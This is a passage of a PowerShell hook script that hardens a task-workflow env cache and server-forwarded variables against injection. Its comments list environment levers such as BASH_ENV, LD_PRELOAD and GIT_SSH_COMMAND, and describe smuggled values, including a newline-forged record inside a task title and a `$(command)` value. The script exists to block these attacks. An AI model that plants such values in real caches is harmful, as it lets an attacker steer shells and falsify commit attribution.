            # line — so a forged continuation is never promoted into a
            # first-class record. Close this gap with that same shape, not by
            # widening the filter below.
            # Test 22p PINS the gap by value across two sequential claims, so
            # closing it turns that test red rather than leaving it silently
            # asserting the old behaviour — flip its four not-survive cases when
            # the re-emit lands.
            # (D280 r2) Pass-through re-emit — Get-EnvCacheLine for the same
            # reason as the claim block above: a CR must not manufacture a line.
            # (D289) Guarded, and the delete half matters more than the
            # rewrite half: an unguarded Remove-Item discards a concurrent
            # write more completely than any rewrite does. -DeleteWhenEmpty
            # fingerprint-checks immediately before removing, so the cache is
            # only deleted if nothing landed since the read that found it
            # empty of preservable records.
            Invoke-EnvCacheRewrite -What 'the claim preserve-or-delete branch' -DeleteWhenEmpty -Build {
            param($before)
            $g280recsU = Split-EnvCacheRecord
            # The same fail-closed guard the other five callers use, and it
            # matters MORE here: with Records empty this branch falls through to
            # Remove-Item and DESTROYS the cache, where every other site merely
            # skips its rewrite. The bash twin over-preserves on this condition
            # deliberately.
            # (D289) This throw now lands in Invoke-EnvCacheRewrite's catch
            # rather than the enclosing one. The OUTCOME is unchanged - the
            # helper returns false, so neither the rewrite nor the delete
            # happens, and nothing follows inside this try - but the mechanism
            # the previous sentence named no longer exists, so it is corrected
            # rather than left to mislead the next reader.
            if (-not $g280recsU.Ok) { throw 'env cache ends inside a quoted value' }
            $preserved = @($g280recsU.Records | Where-Object {
                $_ -match '^TASK_(ID|IDENTIFIER|TITLE|STATUS|COMPLEXITY|PRIORITY)=' -or
                ($_ -match '^TASK_(BASE_REF|HEAD_REF|OWNED|BASE_AT|NARROWED)_[A-Za-z0-9_]+=' -and
                 $_ -notmatch '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)=')
            })
            # An empty result here means "remove the cache", which the helper
            # performs under -DeleteWhenEmpty rather than leaving it bare.
            return @($preserved)
            } | Out-Null
        }

    } catch {
        # Caching failure is non-fatal
    }

    # A claim always opens a new task window: clear the previous task's
    # snapshot, upload state (W1095 — a stale 2xx would suppress the
    # before_review self-heal retry), and dirty baseline unconditionally.
    #
    # (D234) These sit OUTSIDE the try above, and the word "unconditionally" is
    # why. Under Set-StrictMode -Version Latest (:14) reading an absent property
    # throws, so `$json.tool_response` on a claim payload that carries no
    # tool_response — a real shape, and the one the tests send — aborts the try
    # at its first line and lands in the catch. Inside the try these clears were
    # therefore skipped on exactly that path, silently, while the bash twin
    # (no set -e, jq guarded with `|| true`) always reached its equivalents.
    # That divergence was caught by ps1 test 19f, which failed before this move.
    Remove-Item -Force (Join-Path $ProjectDir '.stride-changed-files.json') -ErrorAction SilentlyContinue
    Remove-Item -Force (Join-Path $ProjectDir '.stride-diff-upload-state') -ErrorAction SilentlyContinue
    Remove-Item -Force (Join-Path $ProjectDir '.stride-dirty-baseline') -ErrorAction SilentlyContinue
    # (D234) The durable hook results belong to the task window too. They carry
    # no task id, and the reader rule only covers ABSENCE, so a file left behind
    # by the previous task would be read as this one's.
    Remove-Item -Force (Join-Path $ProjectDir '.stride/.hook-result-*.json') -ErrorAction SilentlyContinue
    # (W2123) The loop state belongs to the task window too, and it is the one
    # file whose staleness has teeth: it exists so a Stop gate can refuse to
    # end a session on an un-followed completion, so a record left over from
    # the PREVIOUS task would fire that gate on work that is already done. A
    # claim is exactly the event that proves the completion was followed.
    # Sits in the unconditional block for the strict-mode reason above.
    #
    # The clear is UNCONDITIONAL, and that is a decision rather than an
    # oversight. Preserving the record on a FAILED claim was implemented and
    # then reverted: the claim that fails most often is the one against an
    # empty ready queue, which is how essentially every session ends. A record
    # preserved there is byte-identical to one left by an agent that completed
    # and never claimed at all — yet a gate must refuse in the second case and
    # must not in the first, and none of the four keys can tell them apart.
    # That is the same false gate this file exists to avoid, reached through
    # the failed-claim branch instead. An over-eager clear costs only a missed
    # gate, and missed is the safe side.
    #
    # Best-effort but NOT silent: a clear that fails leaves a stale record, the
    # one direction this design calls dangerous, so it is announced. The
    # sibling artefacts above are cleared silently because their staleness is
    # benign; this one's staleness is the whole point of the task.
    # (W2125) The recorded terminal state belongs to the task window too: a
    # claim proves a halt was resumed or an error resolved, and a record
    # surviving one would silently disable the Stop gate in every later
    # session. Cleared unconditionally, like its siblings above.
    Remove-Item -Force -LiteralPath (Join-Path $ProjectDir '.stride/.terminal-state.json') -ErrorAction SilentlyContinue
    if (Test-Path -LiteralPath $LoopStateFile) {
        Remove-Item -Force -LiteralPath $LoopStateFile -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $LoopStateFile) {
            [Console]::Error.WriteLine(
                "stride-hook: could not clear the loop state at $LoopStateFile; a stale completion record remains")
        }
    }
}

# Load cached env vars if available (all hooks benefit from this)
#
# (D280) The RHS is now sq_escape-shaped, so it is UNQUOTED here — this is the
# half of the fix that keeps the process environment carrying bare values, which
# is what bash's `source` produces and what every consumer already expects. The
# blast radius if this is dropped is not limited to this script: the Process
# environment is inherited by every `bash -c` child that runs a `.stride.md`
# section, so a section would see TASK_ID='6341' with the quotes attached.
#
# Consumers that already carry a defensive .Trim("'") (the env-backed record
# readers, and the snapshot-base resolvers) keep it and become no-ops: their
# families are hex SHAs, digits and yes/no, none of which can contain a quote,
# so unquoting here leaves nothing for the trim to remove. They are left in
# place deliberately rather than swept, because they also cover a cache written
# by a pre-D280 ps1 that quoted records but not identity lines.
#
# (D280) THREE hardenings here, because this loader is the amplifier: whatever
# it exports lands in the Process environment that every `bash -c` child running
# a .stride.md section inherits, so a forged line here is not a bad value but a
# live interpreter-steering primitive.
#
#   1. Read through Get-EnvCacheLine, which splits the RAW BYTES on LF only.
#      Get-Content used .NET's line reader, which honours a LONE CR as a
#      terminator — so a CR inside a value split one logical line into several
#      and every fragment was exported. The writers now refuse CR too, and this
#      makes the invariant hold from both ends rather than resting on the
#      writers alone. It also makes this loader and Read-TaskRecord finally
#      agree on what a line IS.
#   2. Enforce the key shape, with \z rather than $ per the house rule. A
#      fragment like `='value'` has an empty key and is now dropped rather than
#      exported.
#   3. Export only keys in the cache's OWN namespace — an ALLOW-list.
#
# On (3): this started as a deny-list of shell-steering names (BASH_ENV, PATH,
# LD_PRELOAD, …) and that shape was wrong, not merely incomplete. A deny-list
# has to enumerate every lever an attacker might reach for, and the first draft
# already missed GIT_EXTERNAL_DIFF and GIT_SSH_COMMAND — as good as BASH_ENV
# here, since this script shells out to git constantly — plus CDPATH, LD_AUDIT,
# BASH_XTRACEFD, NODE_OPTIONS, PERL5OPT and HOME. An allow-list inverts the
# burden: it survives the next variable nobody has thought of, which is the only
# property that matters for a list guarding an interpreter's environment.
#
# The namespace below is what this cache legitimately NEEDS to carry — the six
# identity keys, the GOAL_*/BOARD_*/COLUMN_*/AGENT_NAME the server forwards, and
# the five client-owned record families, all TASK_-prefixed. A future key
# outside it fails CLOSED — it silently does not load — which is the correct
# direction for this gate and why the allow-list is stated here, next to the
# enumeration it depends on, rather than hidden in a helper.
#
# SCOPE OF THE CLAIM, stated exactly: this closes the route THROUGH THE CACHE.
# The other route — a server-supplied key exported straight into the Process
# environment by Set-HookEnv, bypassing this loader — was the gap this comment
# used to name as deferred. D275 has since closed it: Get-HookEnvFromPayload is
# now an allow-list of the documented names, so BASH_ENV, PATH and
# GIT_SSH_COMMAND no longer reach Set-HookEnv at all. The two gates are still
# separate and each is still worth having, because they guard different inputs
# — this one the cache file on disk, that one the response body.
#
# The client-owned TASK_BASE_REF* / TASK_HEAD_REF* / TASK_OWNED* /
# TASK_NARROWED* / TASK_BASE_AT* families ARE allowed, deliberately. They are
# fenced out of the SERVER payload (Get-HookEnvFromPayload) because the client
# owns them, but the client WRITES them here and Get-TaskBaseRefFor reads them
# straight back out of this process environment — and each hook invocation is a
# fresh process, so this loader is their ONLY cross-invocation transport.
# Denying them would leave the per-task base permanently empty in every
# consuming invocation, collapsing D226's isolation into the shared
# TASK_BASE_REF path and disabling the owner check — a security regression, not
# just a functional one. The fence belongs at the payload boundary, which has it.
#
# Allowing those families is what makes the SHAPE GATE below necessary. The CR
# route is closed from both ends — every writer flattens, every pass-through
# re-emit reads through Get-EnvCacheLine — but the LF route is NOT, and cannot
# be from this side: the bash twin writes `TASK_TITLE=$(sq_escape ...)` WITHOUT
# flattening (stride-hook.sh), by design, because `source` reassembles a quoted
# value across a newline. So in a mixed checkout a hostile title of
# `x<LF>TASK_BASE_REF_99=deadbeefcafe<LF>y` legitimately becomes three physical
# lines, and the middle one is shaped like a record on this side.
#
# THE SHAPE GATE closes it: a record family value must present the strict
# `'...'` form that both executors' record readers demand. A forged
# continuation is always BARE — it is the interior of someone else's quoted
# value, so its own quotes are already consumed — while every record this
# version writes is quoted. Same check as Read-TaskRecord, applied at the point
# where a forged line would otherwise become a live environment variable.
#
# The one cost, stated rather than discovered later: a cache written by a
# PRE-D280 ps1 recorded `TASK_BASE_REF_<id>=<sha>` bare, so those legacy records
# are refused for one claim window until finalize rewrites them quoted. That
# degrades toward ABSENCE, which the base resolver already treats as the
# conservative direction (no base → refuse or widen, never silently narrow), so
# the failure mode is a wider diff rather than a wrong one.
$script:StrideCacheKeyPattern = '^(?:(?:TASK|GOAL|BOARD|COLUMN)_[A-Za-z0-9_]*|AGENT_NAME)\z'
# (D280 r3) Matched CASE-INSENSITIVELY, unlike the allow-list above, and the
# asymmetry is deliberate — it is the same one Get-HookEnvFromPayload documents.
# Case-sensitivity on the ALLOW-list is safe because it can only admit less;
# case-sensitivity here would admit less GATING, which is the opposite. A line
# keyed TASK_Base_Ref_42 passes the allow-list, misses a case-sensitive record
# pattern, skips the shape gate and is exported bare — and Windows environment
# variables are case-INsensitive, so Get-TaskBaseRefFor('42') then reads that
# forged value. Windows is this script's only target. Reachable with no
# promotion step at all: a cloned repo can simply ship such a .stride-env-cache.
#
# [0-9]+, NOT [A-Za-z0-9_]+. The per-task record namespace is digits-only ids,
# because that is all Get-TaskRecordKey (and bash's task_record_key) will build
# a key for. Matching the wider character class swept in TASK_BASE_REF_OWNER,
# _TRUSTED and _UNPROVEN — which are CONTROL FLAGS sharing the prefix, not
# records, and which this file reserves precisely so they cannot collide. The
# shape gate then refused a bare TASK_BASE_REF_OWNER and silently disabled the
# D226 foreign-owner refusal. Caught by test 21cc; the tight class is the fix.
$script:StrideRecordKeyPattern = '^TASK_(?:BASE_REF|HEAD_REF|OWNED|NARROWED|BASE_AT)_[0-9]+\z'
$script:StrideCacheLines = @()
if (Test-Path $EnvCache) {
    # RECORDS, not physical lines. Reading lines here left the LF route only
    # half closed: an interior line of a bash-authored multi-line value is
    # record-shaped, and while the shape gate below refuses the digit-suffixed
    # families, the four SHARED D226 control keys — TASK_BASE_REF,
    # _TRUSTED, _OWNER, _UNPROVEN — are not in that namespace and sailed
    # through. A forged TASK_BASE_REF_UNPROVEN=1 makes every later run refuse
    # its own snapshot and upload an EMPTY diff for the task; a forged
    # TASK_BASE_REF + _TRUSTED anchors the diff at an attacker-chosen commit.
    # Reading records makes an interior line stop being a candidate key AT ALL,
    # which closes the whole promotion class rather than an enumerated part of
    # it — and makes this loader agree with what `. "$ENV_CACHE"` produces.
    #
    # Split-EnvCacheRecord throws where Get-Content merely errored, and returns
    # Ok=$false for a cache ending inside a quoted run. Loading is best-effort
    # and must never take the hook down: degrade to no cached env, exactly as
    # an absent file does, and exactly as the other five callers do.
    try {
        $g280recsL = Split-EnvCacheRecord
        if ($g280recsL.Ok) { $script:StrideCacheLines = @($g280recsL.Records) }
        else { $script:StrideCacheLines = @() }
    } catch { $script:StrideCacheLines = @() }
}
if ($script:StrideCacheLines.Count -gt 0) {
    foreach ($cacheLine in $script:StrideCacheLines) {
        $line = $cacheLine.Trim()
        if (-not $line) { continue }
        # A record's VALUE may legitimately span physical lines, so the value
        # half matches across newlines while the key half must not — a key
        # containing a newline is not a key.
        if ($line -notmatch '^([^=\r\n]+)=([\s\S]*)\z') { continue }
        $cacheKey = $Matches[1]
        $cacheValue = $Matches[2]
        if ($cacheKey -notmatch '^[A-Za-z_][A-Za-z0-9_]*\z') { continue }
        # -cmatch: the namespace is UPPERCASE by construction, and a
        # case-insensitive match would admit `task_id` — which is a distinct
        # variable to bash (case-sensitive) but the SAME one to Windows
        # (case-insensitive), the exact split the env fence at
        # Get-HookEnvFromPayload documents. Matching case-sensitively here keeps
        # the allow-list meaning one thing on both platforms.
        if ($cacheKey -cnotmatch $script:StrideCacheKeyPattern) { continue }
        # The shape gate, for the five client-owned record families only. A
        # forged LF continuation is bare; a real record is quoted. Applies
        # BEFORE unquoting, because the quotes are the evidence.
        if ($cacheKey -match $script:StrideRecordKeyPattern -and
            $cacheValue -cnotmatch "^'[^']*'\z") { continue }
        # (D281) The single OUT boundary. The cache stores byte-strings; the
        # process environment wants text. Without this projection every
        # non-ASCII value reaches each section child as mojibake.
        [System.Environment]::SetEnvironmentVariable(
            $cacheKey,
            (ConvertFrom-CacheByteString -Value (ConvertFrom-ShSingleQuoted -Value $cacheValue)),
            'Process')
    }
}

# --- Server-supplied hook env forwarding (W1453) ---
# hook-execution.md declares the server's hook env block the single source of
# truth for the variables the executor exports. The functions below extract
# the `env` object from the hook entry of an intercepted response (singular
# `.hook` on claim responses, `.hooks[]` on /complete and /mark_reviewed),
# export every key into the Process environment (inherited by the bash -c
# children that run the sections), and write it to the env cache (D260:
# replacing any prior record for the keys this call writes) so
# follow-up agent commands (e.g. the after_goal PATCH) can still read the
# values. Keys the server omits export as empty strings. Mirrors the bash
# extract_response_payload / extract_hook_env / apply_env_lines /
# export_after_goal_env helpers — both scripts must agree on behavior.

# Peel the API payload out of Claude Code hook input. Same three shapes as
# Test-AfterGoalInResponse (which is rewritten on top of this function).
# Returns the parsed payload object, or $null when unparseable.
function Get-ResponsePayload {
    param([string]$InputJson)

    # (D118) Fast path — prefer the untruncated canonical response file.
    $fromFile = Read-CanonicalResponse
    if ($null -ne $fromFile) { return $fromFile }

    if (-not $InputJson) { return $null }

    try {
        $parsed = $InputJson | ConvertFrom-Json
    } catch {
        return $null
    }

    if ($parsed.PSObject.Properties.Name -notcontains 'tool_response') { return $null }

    $resp = $parsed.tool_response
    if (-not $resp) { return $null }

    $payload = $null

    if ($resp -is [PSCustomObject] -and $resp.PSObject.Properties.Name -contains 'stdout') {
        # Shape 1: {"stdout":"<json>"} wrap (Claude Code Bash tool). A truncated
        # stdout fails to parse and MUST resolve to $null (not the wrapper) so
        # the D119 fresh call fires — hence elseif, never a fall-through to the
        # raw-object shape below.
        try { $payload = $resp.stdout | ConvertFrom-Json } catch { $payload = $null }
    } elseif ($resp -is [string]) {
        # Shape 2: tool_response is itself a JSON-encoded string.
        try { $payload = $resp | ConvertFrom-Json } catch { $payload = $null }
    } elseif ($resp -is [PSCustomObject]) {
        # Shape 3: raw API JSON object directly (other harnesses).
        $payload = $resp
    }

    # (W1086) Shape 4: persisted-output file fallback. When the response is
    # large, Claude Code writes the tool output to a file and leaves only a
    # "Full output saved to: <path>" notice in stdout. Recover the API JSON by
    # reading that file — an existing regular file parsed with ConvertFrom-Json
    # only; never invoked, dot-sourced, or written.
    if ($null -eq $payload) {
        $notice = $null
        if ($resp -is [PSCustomObject] -and $resp.PSObject.Properties.Name -contains 'stdout') {
            $notice = [string]$resp.stdout
        } elseif ($resp -is [string]) {
            $notice = $resp
        }
        if ($notice -and ($notice -imatch 'saved to')) {
            $noticeLine = ($notice -split "`n" | Where-Object { $_ -imatch 'saved to' } | Select-Object -First 1)
            if ($noticeLine) {
                $persistPath = '/' + ($noticeLine -replace '^[^/]*/', '')
                $persistPath = ($persistPath.TrimEnd()) -replace '"$', ''
                if (Test-Path -LiteralPath $persistPath -PathType Leaf) {
                    try {
                        $payload = (Get-Content -LiteralPath $persistPath -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json)
                    } catch {
                        $payload = $null
                    }
                }
            }
        }
    }

    return $payload
}

# Collect the env object of the named hook entry as an ordered map. Keys must
# be valid shell identifiers — anything else is dropped, because the values
# reach a bash -c child via the environment and the cache loader is
# line-based. HOOK_NAME is excluded (the executor routes on its own value; a
# cached HOOK_NAME line would misroute later invocations). TASK_BASE_REF is
# excluded (client-only diff anchor owned by the claim branch).
# (D275) The documented hook-env names, from the Variable Inventory in
# skills/stride-workflow/hook-execution.md. Kept in lockstep with the bash
# twin's STRIDE_HOOK_ENV_ALLOW; the two lists must hold the same 17 names.
$script:StrideHookEnvAllow = @(
    'TASK_ID', 'TASK_IDENTIFIER', 'TASK_TITLE', 'TASK_DESCRIPTION',
    'TASK_STATUS', 'TASK_COMPLEXITY', 'TASK_PRIORITY', 'TASK_NEEDS_REVIEW',
    'BOARD_ID', 'BOARD_NAME', 'COLUMN_ID', 'COLUMN_NAME', 'AGENT_NAME',
    'GOAL_ID', 'GOAL_IDENTIFIER', 'GOAL_TITLE', 'GOAL_DESCRIPTION'
)

function Get-HookEnvFromPayload {
    param($Payload, [string]$HookEntryName)

    $envMap = [ordered]@{}
    if ($null -eq $Payload) { return $envMap }

    $payloadProps = $Payload.PSObject.Properties.Name
    $entries = @()
    if (($payloadProps -contains 'hooks') -and $Payload.hooks) {
        $entries += @($Payload.hooks)
    }
    if (($payloadProps -contains 'hook') -and $Payload.hook -is [PSCustomObject]) {
        $entries += $Payload.hook
    }

    foreach ($entry in $entries) {
        if (-not ($entry -is [PSCustomObject])) { continue }
        if ($entry.PSObject.Properties.Name -notcontains 'name') { continue }
        if ($entry.name -ne $HookEntryName) { continue }
        if ($entry.PSObject.Properties.Name -notcontains 'env') { continue }
        $envObj = $entry.env
        if (-not ($envObj -is [PSCustomObject])) { continue }
        foreach ($prop in $envObj.PSObject.Properties) {
            $key = $prop.Name
            # (D280) \z, not $ — the house rule this file states for
            # Get-TaskRecordKey and Read-TaskRecord, and for the same reason:
            # .NET's $ ALSO matches immediately before a trailing newline, so a
            # server key of "FOO`n" passed this gate and was concatenated
            # unescaped into "$key=", producing a bare `FOO` line that bash
            # EXECUTES as a command name when it sources the cache. Narrow
            # (no arguments, no path, PATH-resolved) but a genuine unescaped
            # write reaching a shell.
            if ($key -notmatch '^[A-Za-z_][A-Za-z0-9_]*\z') { continue }
            # (D226) Fenced by PREFIX, not equality. D142 excluded
            # TASK_BASE_REF as a client-only diff anchor; D226 added
            # TASK_BASE_REF_OWNER, _UNPROVEN, _TRUSTED and the per-task
            # TASK_BASE_REF_<id> records to that same family, and each one
            # defeats a different precedence rule in the base selection. A
            # server-supplied hook-env block must not be able to steer the
            # guard's own inputs.
            # `-like` is case-INsensitive here DELIBERATELY, where the bash
            # twin's jq startswith() is case-sensitive. Windows environment
            # variables are case-insensitive, so a `Task_Base_Ref_100` key
            # WOULD be found by GetEnvironmentVariable('TASK_BASE_REF_100');
            # bash variables are case-sensitive, so the same key is inert
            # there. Do not harmonize these — making this one case-sensitive
            # re-opens the hole it closes.
            # (D273) TASK_NARROWED and TASK_BASE_AT are fenced here for parity
            # with the bash twin, where an unfenced server-supplied verdict or
            # claim stamp could steer the self-heal into under-reporting.
            # (W2102) THIS FENCE IS NOW LOAD-BEARING, not a parity gesture.
            # When it was written this port read none of these families and the
            # keys were inert either way. The narrowing engine now READS them -
            # Test-AnotherOpenWindowExists takes window heads from the process
            # environment, which is exactly what this fence keeps a server
            # response out of - so a gap here would let a forged head or stamp
            # steer attribution rather than sit unused. TASK_OWNED is added for the same reason and
            # in the same breath: the bash twin has fenced it since D255, this
            # side never did, and a parity claim that skipped it would be
            # false the moment anyone relied on it.
            # (D273) STRIDE_* is fenced alongside them: the executor's own
            # tuning knobs are client-owned by definition and none is meant to
            # arrive from the server.
            # (D258) TASK_HEAD_REF completes the set: it was the last of the
            # five client-owned record families left unfenced on both sides.
            # A forged head ref defines where a task's window closes, so it
            # steers commit attribution — and it is durable, because a record
            # forged for a task OTHER than the completing one is never
            # repaired. (W2102) Fenced for parity when written, and now for
            # its own sake: the attribution engine reads head records to bound
            # every window it classifies, so an unfenced one would decide which
            # commits this task is credited with.
            # (D275) ALLOW-list, replacing the deny-list that stood here. What
            # gets past this point is exported straight into the Process
            # environment by Set-HookEnv, so the dangerous set is open-ended —
            # BASH_ENV, PATH, GIT_SSH_COMMAND and the rest all passed the old
            # filter. Enumerating the documented names instead means a key the
            # server invents is excluded because it is absent from the list,
            # not because someone remembered to name it.
            #
            # Case-INSENSITIVE on purpose, and this is the half that has no
            # bash equivalent: Windows environment variable names are
            # case-insensitive, so 'Path' and 'PATH' are the same variable, and
            # a case-sensitive test would admit 'pAtH' as an unrecognised key
            # and then have it collide with PATH on assignment. -contains on a
            # string array is case-insensitive by default, which is the
            # behaviour wanted here rather than an oversight — the same reason
            # the deny-list it replaces used -like.
            #
            # HOOK_NAME stays out: the executor owns it and sets it around the
            # section run. The five client-owned record families and STRIDE_*
            # need no clause now — they are simply not on the list.
            if ($script:StrideHookEnvAllow -notcontains $key) { continue }
            $envMap[$key] = [string]$prop.Value
        }
        break
    }

    return $envMap
}

# (W1454) Server-supplied timeout (milliseconds) for the named hook entry —
# sibling of Get-HookEnvFromPayload, selecting `timeout` instead of `env`.
# Returns [long] milliseconds, or $null when absent/invalid (documented
# defaults apply).
function Get-HookTimeoutMsFromPayload {
    param($Payload, [string]$HookEntryName)

    if ($null -eq $Payload) { return $null }

    $payloadProps = $Payload.PSObject.Properties.Name
    $entries = @()
    if (($payloadProps -contains 'hooks') -and $Payload.hooks) {
        $entries += @($Payload.hooks)
    }
    if (($payloadProps -contains 'hook') -and $Payload.hook -is [PSCustomObject]) {
        $entries += $Payload.hook
    }

    foreach ($entry in $entries) {
        if (-not ($entry -is [PSCustomObject])) { continue }
        if ($entry.PSObject.Properties.Name -notcontains 'name') { continue }
        if ($entry.name -ne $HookEntryName) { continue }
        if ($entry.PSObject.Properties.Name -notcontains 'timeout') { return $null }
        $t = $entry.timeout
        if ($t -is [int] -or $t -is [long] -or $t -is [double]) {
            $ms = [long][math]::Floor([double]$t)
            if ($ms -gt 0) { return $ms }
        }
        return $null
    }
    return $null
}

# (W1454) Resolve the section budget in seconds. Precedence:
#   STRIDE_HOOK_TIMEOUT_OVERRIDE (integer seconds; test/ops escape hatch)
#   > server hook-entry timeout (ms, rounded up to whole seconds)
#   > documented default (600s for every section — parser.md's table).
# (D229) These are HANG DETECTORS, not performance gates. A developer's
# .stride.md commands are theirs; the executor must never kill one for being
# slow. Sized well above every measured legitimate run — cold before_doing 80s,
# cold after_doing 138s (200s+ with coverage), ~1.9x that again under load.
# Clamped to 890s so no inner budget can reach the 900s hooks.json outer
# ceiling. after_doing runs at PRE phase — no tool_response exists yet, so it
# always resolves to the documented 600s default.
function Resolve-SectionBudget {
    param([string]$Section)

    $budget = [long]0
    $override = [System.Environment]::GetEnvironmentVariable('STRIDE_HOOK_TIMEOUT_OVERRIDE', 'Process')
    if ($override -and $override -match '^\d+$' -and [long]$override -gt 0) {
        $budget = [long]$override
    } else {
        $ms = Get-HookTimeoutMsFromPayload -Payload $script:responsePayload -HookEntryName $Section
        if ($ms) { $budget = [long][math]::Ceiling($ms / 1000.0) }
    }
    if ($budget -le 0) {
        $budget = 600
    }
    if ($budget -gt 890) { $budget = 890 }
    return [int]$budget
}

# Export a map into the Process environment (inherited by the bash -c
# children that run sections) and write it to the env cache, best-effort
# (D260: replace-in-place for the keys each call writes, not an append),
# so the values survive for follow-up agent commands. The cache loader is
# line-based, so embedded newlines are collapsed to spaces in the cached
# copy — the process env keeps the exact value. SetEnvironmentVariable
# involves no shell parsing, so crafted values have no injection surface
# here. Never echoes values to stdout/stderr.
function Set-HookEnv {
    # (D289) -AlsoDropPattern lets a caller fold ITS own key drop into this
    # function's single write, instead of making a second rewrite of its own.
    # See the note in the filter below, and Set-AfterGoalEnv, its one user.
    param($EnvMap, [string]$AlsoDropPattern)

    # (D289) NOTE FOR -AlsoDropPattern CALLERS: this early return skips the
    # cache write entirely, so a caller folding its own drop into this one gets
    # NO drop when the map is empty. Set-AfterGoalEnv, its only user, is safe
    # because its defaults loop puts all four GOAL_* keys into the map before
    # calling - Count is never below 4 there. A future caller passing a pattern
    # with a possibly-empty map would silently lose its drop; the coupling is
    # recorded here and at that call site rather than left to be rediscovered.
    if ($null -eq $EnvMap -or $EnvMap.Count -eq 0) { return }

    $cacheLines = @()
    foreach ($key in @($EnvMap.Keys)) {
        $value = [string]$EnvMap[$key]
        [System.Environment]::SetEnvironmentVariable($key, $value, 'Process')
        if ($value -eq '') {
            # SetEnvironmentVariable('', 'Process') DELETED the variable —
            # remember the key so sections still see it defined-but-empty.
            if ($script:StrideEmptyEnvKeys -notcontains $key) {
                $script:StrideEmptyEnvKeys += $key
            }
        } else {
            $script:StrideEmptyEnvKeys = @($script:StrideEmptyEnvKeys | Where-Object { $_ -ne $key })
        }
        # (D280) Flatten THEN quote — both, in that order, and neither is
        # redundant. The flatten (W1453) stops a value becoming a second
        # physical line, which this port's line-oriented loader and every
        # prefix filter below would misread as a record of its own. The quote
        # stops bash INTERPRETING the value when it sources the file: without
        # it a server-supplied `$(command)` executes at source time, which is
        # the defect D280 exists to close. Order matters only in that the
        # flatten must not run over the escaped form, where it could rewrite a
        # newline that quoting had already made safe to keep.
        # (D281) IN boundary — see THE STORAGE PROJECTION. Server-supplied
        # values routinely carry non-ASCII, so this one is load-bearing rather
        # than belt-and-braces.
        $cacheLines += "$key=" + (ConvertTo-ShSingleQuoted -Value (ConvertTo-CacheByteString -Value (ConvertTo-FlatEnvValue -Value $value)))
    }
    # (D260) Replace-in-place for the keys THIS call writes, rather than a bare
    # append. Appending left two lines per identity key after a single
    # parseable claim — the rewrite wrote the data block's values, this wrote
    # the env block's — so a first-match reader and a sourcing reader
    # disagreed whenever the two blocks skewed, and within a claim window every
    # later post hook added another copy. The forwarded env value wins, which
    # is what the export above has already put in the process env, so no
    # section can observe the change; only the cache stops contradicting
    # itself. Keys this call does not write are passed through untouched,
    # including all five per-task record families.
    #
    # A plain line filter is correct here, unlike in the bash twin, because the
    # newline flattening above means a cache line on this side is always a
    # whole record. Best-effort throughout: on any failure the export has
    # already succeeded and the previous cache is left intact.
    # (D289) Under the compare-and-swap. This is the busiest unguarded caller -
    # every one of the five hooks reaches it - so it is the one most likely to
    # be the writer that discards a concurrent record write.
    try {
        $written = @($EnvMap.Keys)
        Invoke-EnvCacheRewrite -What 'the hook env' -Build {
            param($before)
            $kept = @()
            if ($null -ne $before) {
                # (D280 r2) Pass-through re-emit — Get-EnvCacheLine, not
                # Get-Content, so a CR-bearing line authored elsewhere cannot be
                # split into fragments this filter then keeps and promotes.
                $g280recsH = Split-EnvCacheRecord
                if (-not $g280recsH.Ok) { throw 'env cache ends inside a quoted value' }
                $kept = @($g280recsH.Records | Where-Object {
                    $idx = $_.IndexOf('=')
                    if ($idx -lt 1) { return $true }
                    $k = $_.Substring(0, $idx)
                    if ($written -contains $k) { return $false }
                    # (D289) The caller's own extra drop, applied in the SAME
                    # filter as this one so the two become a single write under
                    # a single compare-and-swap. Set-AfterGoalEnv used to make
                    # its GOAL_* drop as a separate rewrite immediately before
                    # calling here; guarding those two independently would have
                    # been worse than leaving them alone, because a collision on
                    # either half would abandon that half on its own.
                    if ($AlsoDropPattern -and $k -match $AlsoDropPattern) { return $false }
                    return $true
                })
            }
            return @(@($kept) + @($cacheLines))
        } | Out-Null
    } catch {
        # Best-effort cache write — export already succeeded.
    }
}

# after_goal env: export what the server supplied, default every documented
# GOAL_* key it omitted to an empty string (defined-but-empty, never an
# error), and fall back to the completed task's parent_id from the same
# response payload when GOAL_ID itself is missing or empty. The fallback is
# response-local — the executor still never queries the API for goal state.
function Set-AfterGoalEnv {
    param($Payload)

    $envMap = Get-HookEnvFromPayload -Payload $Payload -HookEntryName 'after_goal'

    foreach ($key in @('GOAL_ID', 'GOAL_IDENTIFIER', 'GOAL_TITLE', 'GOAL_DESCRIPTION')) {
        if (-not $envMap.Contains($key)) { $envMap[$key] = '' }
    }

    # Parent-id fallback: the server built the after_goal env from the
    # completed child task and omitted GOAL_ID (or sent it empty). The parent
    # id in the same response's data object IS the goal id.
    if (-not $envMap['GOAL_ID'] -and $null -ne $Payload) {
        $parentId = $null
        $payloadProps = $Payload.PSObject.Properties.Name
        if (($payloadProps -contains 'data') -and $Payload.data -and
            ($Payload.data.PSObject.Properties.Name -contains 'parent_id')) {
            $parentId = $Payload.data.parent_id
        } elseif ($payloadProps -contains 'parent_id') {
            $parentId = $Payload.parent_id
        }
        if ($null -ne $parentId -and "$parentId") { $envMap['GOAL_ID'] = "$parentId" }
    }

    # (D257) Drop any GOAL_* lines a PREVIOUS after_goal run in this same claim
    # window left behind, so the write below leaves exactly one record per key.
    # Set-HookEnv appended unconditionally then, and nothing truncates the cache
    # between two after_goal runs, so without this a first-match reader and a
    # sourcing reader disagree — and worse, a first-match reader stitches this
    # run's GOAL_ID to the previous run's GOAL_IDENTIFIER, naming the wrong
    # goal in whatever the section builds.
    #
    # (D260) Set-HookEnv now replaces in place for the keys each call writes,
    # and on THIS port that makes this filter FULLY redundant — state it
    # accurately rather than borrowing the bash twin's reasoning, because the
    # orderings differ and only one of the two comments can be right about
    # each. Here the defaults loop puts all four GOAL_* keys into $envMap, the
    # parent-id fallback assigns into that same map, and only then is
    # Set-HookEnv called — so its collapse, keyed on $EnvMap.Keys, already
    # covers every GOAL_* key including the fallback's. The bash twin's
    # equivalent block is genuinely NOT redundant, because there
    # apply_env_lines runs BEFORE the fallback and the fallback assigns only a
    # shell variable — so without it the bash cache would keep the empty
    # default while its process env held the parent id.
    #
    # Retained anyway, as defence in depth and nothing more: it is the D257
    # guarantee's local guard, and deleting it would make D257 depend entirely
    # on a shared function three hundred lines away that a later refactor could
    # narrow without anyone rechecking after_goal. It costs one filtered read.
    #
    # This port's exposure is only ACROSS runs: Get-HookEnvFromPayload builds
